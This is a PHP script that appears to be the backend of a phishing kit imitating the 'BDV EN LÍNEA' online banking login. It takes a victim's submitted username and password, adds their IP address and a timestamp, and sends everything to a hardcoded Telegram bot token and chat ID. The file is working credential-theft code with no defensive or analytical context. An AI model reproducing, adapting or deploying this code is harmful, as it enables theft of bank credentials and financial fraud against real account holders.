<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// Verificar que sea una petición POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Recibir y validar datos
    if (isset($_POST['usuario']) && isset($_POST['password'])) {
        
        $usuario = $_POST['usuario'];
        $password = $_POST['password'];
        $ip = $_SERVER['REMOTE_ADDR'];
        $fecha = date('Y-m-d H:i:s');

        // Configuración Telegram
        $token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
        $chat_id = "6912929677";

        // Crear mensaje
        $mensaje = "🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n";
        $mensaje .= "👤 Usuario: $usuario\n";
        $mensaje .= "🔑 Clave: $password\n";
        $mensaje .= "🌐 IP: $ip\n";
        $mensaje .= "📅 Fecha: $fecha\n";
        $mensaje .= "\n═══════════════════\n";

        // Enviar a Telegram usando file_get_contents (método alternativo)
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $mensaje,
            'parse_mode' => 'HTML'
        ];
        
        file_get_contents($url . '?' . http_build_query($data));
        
        echo json_encode([
            "success" => true,
            "message" => "Datos recibidos y enviados"
        ]);
    } else {
        echo json_encode([
            "success" => false,
            "error" => "Faltan datos requeridos"
        ]);
    }
} else {
    echo json_encode([
        "success" => false,
        "error" => "Método no permitido"
    ]);
}
?> 